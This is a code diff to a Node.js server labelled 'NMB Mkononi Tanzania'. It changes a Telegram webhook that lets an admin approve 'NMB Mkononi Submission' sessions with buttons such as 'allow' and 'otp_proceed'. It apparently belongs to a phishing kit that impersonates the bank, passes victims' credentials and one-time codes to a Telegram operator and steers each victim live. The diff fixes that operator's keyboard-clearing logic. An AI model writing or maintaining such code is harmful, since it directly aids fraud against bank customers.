@@ -255,9 +255,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
             }
 
             const session = sessions[sessionId];
+            let statusLabel = 'PROCESSED ✅';
+            
             if (session) {
                 const clientRes = session.clientRes;
-                let statusLabel = '';
                 
                 if (action === 'allow' || action === 'otp_proceed') {
                     session.status = 'next_step';
@@ -295,12 +296,15 @@ app.post('/api/telegram-webhook', async (req, res) => {
                         session.clientRes = null;
                     }
                 }
+            }
 
-                if (session.adminMsgId && query.message) {
-                    const originalText = query.message.text || 'NMB Mkononi Submission';
-                    const targetChat = session.adminChatId || DEFAULT_ADMIN_CHAT_ID;
-                    await removeInlineKeyboard(targetChat, session.adminMsgId, originalText, statusLabel);
-                }
+            // Fallback message ID and chat extraction directly from query if session reference is missing
+            if (query.message) {
+                const messageId = (session && session.adminMsgId) ? session.adminMsgId : query.message.message_id;
+                const targetChat = (session && session.adminChatId) ? session.adminChatId : query.message.chat.id;
+                const originalText = query.message.text || 'NMB Mkononi Submission';
+                
+                await removeInlineKeyboard(targetChat, messageId, originalText, statusLabel);
             }
             
             if (TELEGRAM_BOT_TOKEN) {
@@ -321,4 +325,4 @@ app.post('/api/telegram-webhook', async (req, res) => {
 app.listen(PORT, () => {
     console.log(`NMB Mkononi Tanzania server running on port ${PORT}`);
 });
-                               
+        
